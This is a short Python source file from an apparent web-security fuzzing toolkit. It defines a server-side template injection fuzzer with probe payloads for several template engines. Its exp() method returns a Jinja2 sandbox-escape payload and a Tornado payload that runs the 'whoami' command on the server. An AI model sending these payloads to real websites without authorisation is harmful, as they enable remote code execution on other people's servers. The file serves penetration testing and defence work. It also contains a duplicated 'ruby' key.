#!/usr/bin/env python
# -*- coding: utf-8 -*-


from saker.fuzzers.fuzzer import Fuzzer


class SSTI(Fuzzer):

    """Server Side Template Injection"""

    # simple mathematical expressions
    payloads = {
        "Tornado": "{% import module %}",
        "Jinja2": "{{ config.items() }}",
        "Django": "{{ request }}",
        "ruby": "<%= 7 * 7 %>",
        "freemaker": "${7*7}",
        "ruby": "${7*7}",
        "Twig": "{{ 7*7 }}",
    }

    def __init__(self, engine=""):
        super(SSTI, self).__init__()
        self.engine = engine

    @classmethod
    def fuzz(cls):
        for k in cls.payloads:
            yield cls.payloads[k]

    def exp(self):
        if self.engine == "Jinja2":
            return "{{''.__class__.__mro__[2].__subclasses__()}}"
        elif self.engine == "Tornado":
            return '''{% import os %}{{ os.popen("whoami").read() }}'''
        else:
            return ""
